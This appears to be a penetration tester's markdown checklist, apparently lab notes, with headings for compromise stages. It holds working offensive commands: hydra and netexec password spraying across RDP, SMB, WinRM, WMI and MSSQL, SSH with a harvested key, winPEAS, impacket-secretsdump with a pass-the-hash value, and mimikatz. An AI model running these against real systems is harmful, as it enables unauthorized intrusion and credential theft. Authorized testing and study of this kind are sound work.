# Penetration Test Checklist



## Web Application Testing



## Initial Compromise of Network

* [ ] nmap scan of internal network
* [ ] smb shares



## Harvested a New Credential&#x20;

### Spray Passwords

* ```shell-session
  $ hydra -l "yoshi" -p 'Mushroom!' -M ips.txt rdp
  ```
* ```shell-session
  $ netexec smb ips.txt -u users.txt -p passwords.txt 
  ```
* ```shell-session
  $ netexec winrm ips.txt -u users.txt -p passwords.txt
  ```
* <pre class="language-shell-session"><code class="lang-shell-session"><strong>$ netexec wmi ips.txt -u users.txt -p passwords.txt 
  </strong></code></pre>
* <pre class="language-shell-session"><code class="lang-shell-session"><strong>$ netexec mssql ips.txt -u users.txt -p passwords.txt 
  </strong></code></pre>





## Harvested a new Private Key

### Spray Intranet (.ssh)

If we have a shell on a box and notice a user has a private key in their home directory, we should test it against all computers with ssh open.

* ```shell-session
  victim@host$ ssh -i id_rsa mario@172.16.233.14
  ```

## Popped a new Shell

#### Enumerate

* <pre><code><strong>$ .\winPEASx64.exe
  </strong></code></pre>

#### (PWNED) - Dump Secrets

* <pre class="language-shell"><code class="lang-shell"><strong>$ proxychains impacket-secretsdump -hashes ":e728ecbadfb02f51ce8eed753f3ff3fd" celia.almeda@10.10.85.142
  </strong></code></pre>
* ```powershell
  $ mimikatz
  ```

## Privilege Escalation

* [ ] PayloadAllTheThings&#x20;

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" %}

## Lateral Movement

*
